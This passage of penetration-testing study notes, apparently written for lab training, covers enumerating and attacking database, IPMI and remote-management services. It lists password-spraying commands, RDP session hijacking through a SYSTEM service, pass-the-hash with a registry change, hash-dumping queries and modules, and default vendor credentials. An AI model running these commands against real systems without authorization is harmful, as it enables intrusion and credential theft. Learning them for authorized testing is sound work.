|secure_file_priv|	This variable is used to limit the effect of data import and export operations.|

- [ ] Nmap
    - [ ] `sudo nmap TARGET_IP -sV -sC -p3306 --script mysql*`

- [ ] MySQL
    - [ ] `mysql -u root -h TARGET_IP`
    - [ ] `mysql -u root -pP4SSw0rd -h TARGET_IP`

## MSSQL
- MSSQL uses tcp port 1433.
- When MSSQL operates in a "hidden" mode, it uses the TCP/2433 port.
### **Dangerous Settings**
- MSSQL clients not using encryption to connect to the MSSQL server
- The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
- The use of named pipes
- Weak & default sa credentials. Admins may forget to disable this account
-----------------------------------------------------------------------------------------------------
- Connecting with Mssqlclient.py: `python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth`
- List databases `select name from sys.databases`

- [ ] Nmap
    - [ ] `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password='',mssql.instance-name=MSSQLSERVER -sV -p 1433 TARGET_IP`
- [ ] Metasploit auxiliary scanner `mssql_ping` 

## Oracle TNS
- Oracle Transparent Network Substrate (TNS) is a communication protocol that facilitates communication between Oracle databases and applications over networks.

- It uses default port TCP/1521 
- Configuration files `tnsnames.ora` and `listener.ora` located in the `$ORACLE_HOME/network/admin` directory
- The client-side Oracle Net Services software uses the `tnsnames.ora` file to resolve service names to network addresses, while the listener process uses the `listener.ora` file to determine the services it should listen to and the behavior of the listener.
- Oracle databases can be protected by using so-called PL/SQL Exclusion List (PlsqlExclusionList).It is a user-created text file that needs to be placed in the `$ORACLE_HOME/sqldeveloper` directory.
- Use sqlplus to connect to the database `sqlplus USER/PASS@TARGET_IP/XE` , `sqlplus USER/PASS@TARGET_IP/XE as sysdba`
> [!TIP] 
> If you come across the following error **sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory**, please execute the below: `sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig`

- Oracle RDBMS commands:
    - `select table_name from all_tables;`
    - `select * from user_role_privs;`
    - `select name, password from sys.user$;`

- SIDs
    - SID = the unique name of a specific database.
    - It’s necessary for connecting to the correct database version.
    - Admins use the SID to manage and monitor databases.
> [!TIP]
>  Oracle 9 has a default password `CHANGE_ON_INSTALL`. Oracle DBSNMP service also uses a default password `dbsnmp`

- Run the following bash script before enumerating the service to download a few packages and tools for our Pwnbox instance in case it does not have these already: 
```
#!/bin/bash

sudo apt-get install libaio1 python3-dev alien -y
git clone https://github.com/quentinhardy/odat.git
cd odat/
git submodule init
git submodule update
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-basic-linux.x64-21.12.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/2112000/instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
unzip instantclient-sqlplus-linux.x64-21.12.0.0.0dbru.zip
export LD_LIBRARY_PATH=instantclient_21_12:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```


- [ ] Nmap
    - [ ] `sudo nmap -p1521 -sV TARGET_IP --open`
    - [ ] `sudo nmap -p1521 -sV TARGET_IP --open --script oracle-sid-brute`

- [ ] odat
    - [ ] `./odat.py all -s TARGET_IP`
    - [ ] File upload `./odat.py utlfile -s TARGET_IP -d XE -U USER -P PASS --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt`

## IPMI

- Intelligent Platform Management Interface (IPMI) is a tool that lets system administrators manage and monitor a computer, even if it’s turned off or unresponsive. Think of it as a remote control for a computer that works independently of the operating system, BIOS, or CPU. This means admins can fix issues, restart systems, and even update software without needing to physically touch the machine.

- It works directly with the hardware, so it doesn't need the operating system to be running.
- Even if the computer is off or broken, IPMI can still be used to check things like temperature, voltage, and power supply.
- IPMI allows admins to:
    - Change BIOS settings before the operating system starts.
    - Manage the system when it’s powered off.
    - Access the system after a crash.

- IPMI communicates over a network and uses port 623 (UDP).
- **Components of IPMI:**
    - BMC (Baseboard Management Controller): This is like the "brain" of IPMI that controls everything.
    - IPMB (Intelligent Platform Management Bus): It helps the BMC communicate with other parts of the system.
    - ICMB (Intelligent Chassis Management Bus): Used to manage multiple systems (like multiple computers in a rack).
    - IPMI Memory: Stores important data such as event logs and inventory information.

- Unique default passwords for BMCs

|Product|	Username	| Password   |
|:-------|:------------|:------------|
|Dell iDRAC|	root	|calvin       | 
|HP iLO	|   Administrator	| randomized 8-character string consisting of numbers and uppercase letters|
|Supermicro IPMI|	ADMIN	|ADMIN|

- [ ] Nmap 
    - [ ] `sudo nmap -sU --script ipmi-version -p 623 TARGET_IP`
- [ ] Metasploit
    - [ ] Scanner module `auxiliary/scanner/ipmi/ipmi_version`
    - [ ] Retrieve IPMI hashes `scanner/ipmi/ipmi_dumphashes` 


## Attacking RDP 
- Using the [Crowbar](https://github.com/galkan/crowbar) tool, we can perform a password spraying attack against the RDP service: `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`
- We can also use hydra: `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp`

### RDP Session Hijacking
![Example](/images/rdp_session-1-2.png)
- To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session: `C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}`

- If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz. A simple trick is to create a Windows service that, by default, will run as Local System and will execute any binary with SYSTEM privileges. We will use Microsoft sc.exe binary. 
```SQL
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```
![Example 2](/images/rdp_session-2-2.png)

- To run the command, we can start the sessionhijack service : `C:\htb> net start sessionhijack`


### RDP Pass-the-Hash (PtH)
- There are a few caveats to this attack:

    - Restricted Admin Mode, which is disabled by default, should be enabled on the target host; otherwise, we will be prompted with the following error:
    - 
    ![error](/images/error.png)
    - This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa. It can be done using the following command: `C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`

    - Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access: `xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9`


- [ ] Check for BlueKeep with CVE-2019-0708.




## Remote Management Protocols
### Linux Remote Management Protocols
#### SSH

- Default configuration file `/etc/ssh/sshd_config`
##### Dangerous Settings

|Setting	|      Description      |
|:-----------|:----------------------|
|PasswordAuthentication yes	|Allows password-based authentication.|
|PermitEmptyPasswords yes	|Allows the use of empty passwords.|
|PermitRootLogin yes	|Allows to log in as the root user.|
|Protocol 1	|Uses an outdated version of encryption.|
|X11Forwarding yes|	Allows X11 forwarding for GUI applications.|
|AllowTcpForwarding yes	|Allows forwarding of TCP ports.|
|PermitTunnel	|Allows tunneling.|
|DebianBanner yes	|Displays a specific banner when logging in.|

- Use SSH-Audit to footprint the service 
```
git clone https://github.com/jtesta/ssh-audit.git && cd ssh-audit
./ssh-audit.py TARGET_IP
```

#### Rsync
- Rsync is a fast and efficient tool for locally and remotely copying files. It can be used to copy files locally on a given machine and to/from remote hosts.
- It is often used for backups and mirroring.
- It uses port 873
- Probing for accessible shares `nc -nv 127.0.0.1 873`
- Enumerating an open share `rsync -av --list-only rsync://127.0.0.1/dev`
- We can sync all files to our attack host with the command `rsync -av rsync://127.0.0.1/dev`. If Rsync is configured to use SSH to transfer files, we can modify our commands to include the `-e ssh`flag, or `-e "ssh -p2222"` if a non-standard port is in use for SSH.
- [ ] Nmap 
    - [ ] `sudo nmap -sV -p 873 127.0.0.1`

#### R-Services
- R-Services are a suite of services hosted to enable remote access or issue commands between Unix hosts over TCP/IP.
- It replaced by the Secure Shell (SSH) protocols.
- R-services span across the ports 512, 513, and 514.
- **The R-commands suite consists of the following programs:**

    - rcp (remote copy)
    - rexec (remote execution)
    - rlogin (remote login)
    - rsh (remote shell)
    - rstat
    - ruptime
    - rwho (remote who)

- Access using rlogin `rlogin 10.0.17.2 -l htb-student`
- The` /etc/hosts.equiv` file contains a list of trusted hosts and is used to grant access to other systems on the network.
-  The `hosts.equiv` and `.rhosts` files contain a list of hosts (IPs or Hostnames) and users that are trusted by the local host when a connection attempt is made using r-commands

- [ ] Nmap
    - [ ] `sudo nmap -sV -p 512,513,514 TARGET_IP`

### Windows Remote Management Protocols
- Windows servers can be managed locally using Server Manager administration tasks on remote servers. 
- Remote management is enabled by default starting with Windows Server 2016. 
- The main components used for remote management of Windows and Windows servers are the following:

    - Remote Desktop Protocol (RDP)
    - Windows Remote Management (WinRM)
    - Windows Management Instrumentation (WMI)

#### RDP 
- RDP uses TCP port 3389
- [Perl script](https://github.com/CiscoCXSecurity/rdp-sec-check) can unauthentically identify the security settings of RDP servers based on the handshakes. `./rdp-sec-check.pl TARGET_IP`
- To initiate an RDP session `xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:TARGET_IP`
- [ ] Nmap
    - [ ] `nmap -sV -sC TARGET_IP -p3389 --script rdp*`

#### WinRM
- WinRM uses the Simple Object Access Protocol (SOAP) to establish connections to remote hosts and their applications. 
- WinRM must be explicitly enabled and configured starting with Windows 10.
- WinRM relies on TCP ports 5985 and 5986 for communication, with the last port 5986 using HTTPS
- Use [evil-winrm](https://github.com/Hackplayers/evil-winrm) to interact with this WinRM: `evil-winrm -i TARGET_IP -u USER -p PASS`

- [ ] Nmap
    - [ ] `nmap -sV -sC TARGET_IP -p5985,5986 --disable-arp-ping -n`

#### WMI
- Windows Management Instrumentation (WMI) is Microsoft's implementation and also an extension of the Common Information Model (CIM), core functionality of the standardized Web-Based Enterprise Management (WBEM) for the Windows platform.
- WMI allows read and write access to almost all settings on Windows systems.
- WMI is typically accessed via PowerShell, VBScript, or the Windows Management Instrumentation Console (WMIC).
- WMI is not a single program but consists of several programs and various databases, also known as repositories.
- The initialization of the WMI communication always takes place on TCP port 135, and after the successful establishment of the connection, the communication is moved to a random port.
- The program [wmiexec.py](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py) from the Impacket toolkit can be used for this: `/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@TARGET_IP "hostname"`
